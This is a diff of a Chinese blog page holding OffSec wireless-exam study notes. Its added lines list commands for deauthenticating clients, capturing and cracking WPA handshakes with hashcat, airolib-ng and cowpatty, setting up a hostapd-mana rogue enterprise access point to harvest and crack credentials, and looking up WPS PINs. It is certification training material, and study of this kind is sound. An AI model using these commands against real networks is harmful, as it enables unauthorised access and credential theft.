@@ -18,7 +18,7 @@
      <div class="header">
       <div class="logo_title">
 		  
-        <div class="title animated fadeInDown"><img src="https://10086skynet.top/images/avatar.png?v=1709087769186"/>
+        <div class="title animated fadeInDown"><img src="https://10086skynet.top/images/avatar.png?v=1709194224545"/>
 
           <h1 title="NothingBlog" class="weaklink"><a href="/">NothingBlog</a>
 
@@ -137,7 +137,7 @@
 
   <div class="post_details">
     <div class="info"><i class="fa fa-clock-o"></i>
-<span class="date_info">2023-01-09</span>
+<span class="date_info">2023-01-08</span>
 <i class="fa fa-eye"></i>
 
 
@@ -474,6 +474,7 @@ export PATH</li>
 <li>常见问题<br>
 https://help.offsec.com/hc/en-us/sections/360008126631-Proctored-Exams<br>
 https://help.offsec.com/hc/en-us/requests/new</li>
+<li>上传报告 https://upload.offsec.com/</li>
 </ul>
 <p>- <strong>确定设备的驱动程序和详细信息</strong></p>
 <ul>
@@ -534,7 +535,9 @@ https://help.offsec.com/hc/en-us/requests/new</li>
 <li>sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan1 精准捕获数据包输出到 cap1 文件</li>
 <li>sudo airodump-ng --output-format csv,pcap wlan1 输出的文件扩展名</li>
 <li>sudo aireplay-ng -9 wlan1 注入测试</li>
+<li>iwconfig wlan1 channel 10 接入点和无线网卡锁定在10信道上</li>
 <li>sudo aireplay-ng -9 -e wifi名 -a 34:08:04:09:3D:38 wlan1 精准注入测试</li>
+<li>sudo aireplay-ng -0 1 -a MAC地址（bssid） -c ESSID  wlan1</li>
 <li>sudo aireplay-ng -9 -i wlan1 wlan0 卡对卡注入测试</li>
 <li>aircrack-ng -S CPU 上的基准测试</li>
 <li>sudo airdecap-ng -b 34:08:04:09:3D:38 opennet-01.cap 从捕获的文件中过滤其他 AP</li>
@@ -565,17 +568,102 @@ rsmangler --file wordlist.txt --output mangled.txt RSMangler 输出到文件</li
 <li>cat wordlist.txt | rsmangler --file - 连接到 RSMangler 的单词列表</li>
 <li>rsmangler --file wordlist.txt --min 12 --max 13 用修改单词列表 RSManger 并限制为 12-13 个字符</li>
 <li>rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w - 组合 RSMangler 重整 并将其通过管道传输到 Aircrack-ng</li>
-<li></li>
+<li>hashcat -I  显示设备属性</li>
+<li>hashcat -b -m 2500 基准测试</li>
+<li>sudo apt install hashcat-utils 安装 hashcat 实用程序</li>
+<li>/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx 将 PCAP 转换为 hashcat 的 hccapx</li>
+<li>hashcat -m 2500 output.hccapx /usr/share/john/password.lst  使用 hashcat 进行破解</li>
+<li>echo wifu &gt; essid.txt 将目标 ESSID 添加到文件<br>
+airolib-ng wifu.sqlite --import essid essid.txt 导入 ESSID Airolib-NG<br>
+airolib-ng wifu.sqlite --stats 查看 airolib-ng 数据库 统计数据<br>
+airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst 将密码导入到 airolib-ng 数据库<br>
+airolib-ng wifu.sqlite --batch 为 ESSID 生成 PMK<br>
+aircrack-ng -r wifu.sqlite wpa1-01.cap 恢复 WPA 密码 airolib-ng 数据库</li>
+<li>genpmk -f /usr/share/john/password.lst -d wifuhashes -s wifu 创建预先计算的哈希表<br>
+cowpatty -r wpajohn-01.cap -d wifuhashes -s wifu 使用预先计算的哈希表</li>
 </ul>
-<p>1<br>
-- <strong>aa</strong></p>
+<p>- <strong>WPA/WPA2企业网络</strong></p>
 <ul>
-<li>aa</li>
-<li>aa<br>
-1<br>
-- <strong>aa</strong></li>
-<li>aa</li>
-<li>aa<br>
+<li>终止影响网卡的其余进程 sudo airmon-ng check kill</li>
+<li>启用监控模式 sudo airmon-ng start wlan0mon</li>
+<li>收集wifi信息（MGT为企业网络） sudo airodump-ng  wlan0mon</li>
+<li>抓握手包（保持运行直到抓取成功后停止） sudo airodump-ng -c 2 -w wifi名 wlan0mon</li>
+<li>导致wifi重连 sudo aireplay-ng -0 1 -a MAC地址(BSSID) -c ESSID   wlan0mon</li>
+<li>停用监控模式 sudo airmon-ng stop wlan0mon</li>
+<li>打开cap包 sudo wireshark wifi名-o1.cap</li>
+<li>过滤地址 wlan.bssid==xxxxx &amp;&amp; eap &amp;&amp; tls.handshake.certificate</li>
+<li>打开Extensible Authentication Protocol-Transport Layer Security-Certificate-Handshake Protocol-Certificate-两串长字符-右击第一串长字符-点击Export保存为cert.der</li>
+<li>看证书的Issuer和Subject openssl x509 -inform der -in cer.der -text</li>
+<li>输出crt openssl x509 -inform der -in cer.der -outform pem -out output.crt</li>
+<li>查看crt cat output.crt<br>
+-安装开源的 RADIUS 服务器 sudo apt install freeradius</li>
+<li>修改ca文件的50-55行 sudo mousepad /etc/freeradius/3.0/certs/ca.cnf<br>
+countryName		= US<br>
+stateOrProvinceName	= CA<br>
+localityName		= San Francisco<br>
+organizationName	= Playtronics<br>
+emailAddress		= ca@playtronics.com<br>
+commonName		= &quot;Playtronics Certificate Authority&quot;</li>
+<li>修改server文件的49-54行 sudo mousepad /etc/freeradius/3.0/certs/server.cnf<br>
+countryName		= US<br>
+stateOrProvinceName	= CA<br>
+localityName		= San Francisco<br>
+organizationName	= Playtronics<br>
+emailAddress		= admin@playtronics.com<br>
+commonName		= &quot;Playtronics&quot;</li>
+<li>进cnf目录编译<br>
+sudo -s<br>
+cd /etc/freeradius/3.0/certs/<br>
+rm dh<br>
+make<br>
+exit</li>
+<li>安装 hostapd-mana sudo apt install hostapd-mana</li>
+<li>修改conf文件 sudo mousepad /etc/hostapd-mana/hostapd-mana.conf<br>
+ssid=Playtronics<br>
+ca_cert=/etc/freeradius/3.0/certs/ca.pem<br>
+server_cert=/etc/freeradius/3.0/certs/server.pem<br>
+private_key=/etc/freeradius/3.0/certs/server.key<br>
+eap_user_file= /etc/hostapd-mana/hostapd-mana.eap_user<br>
+mana_credout=/tmp/hostapd.credout</li>
+<li>查看eap_user文件并包含以下内容  sudo mousepad /etc/hostapd-mana/hostapd-mana.eap_user</li>
+</ul>
+<ul>
+<li>
+<pre><code>PEAP,TTLS,TLS,FAST
+</code></pre>
+</li>
+</ul>
+<p>&quot;t&quot;   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    &quot;pass&quot;   [2]</p>
+<ul>
+<li>启动hostapd-mana  sudo hostapd-mana /etc/hostapd-mana/hostapd-mana.conf<br>
+username:cosmo<br>
+password:123456<br>
+提取asleep后面的字符串</li>
+<li>跑asleep后面的字符串获取明文密码 asleep -C xxxxxxx -W /usr/share/john/password.lst</li>
+<li>查看credout文件 cat /tmp/hostapd.credout</li>
+<li>手动连接<br>
+前台连接 sudo wpa_supplicant -i wlan0 -c wifi-client.conf<br>
+后台连接 sudo wpa_supplicant -i wlan0 -c wifi-client.conf -B<br>
+sudo dhclient wlan0</li>
+</ul>
+<p>连接到wep的wifi-client.conf<br>
+network={<br>
+ssid=&quot;hotel_wifi&quot;<br>
+scan_ssid=1<br>
+}</p>
+<p>连接到WPA-PSK 的wifi-client.conf<br>
+network={<br>
+ssid=&quot;home_network&quot;<br>
+scan_ssid=1<br>
+psk=&quot;correct battery horse staple&quot;<br>
+key_mgmt=WPA-PSK<br>
+}</p>
+<p>- <strong>WPS网络</strong></p>
+<ul>
+<li>sudo apt install airgeddon</li>
+<li>source /usr/share/airgeddon/known_pins.db</li>
+<li>检查数据库中 BSSID 开头的 AP “0013F7”<br>
+echo ${PINDB[&quot;0013F7&quot;]}<br>
 1<br>
 - <strong>aa</strong></li>
 <li>aa</li>
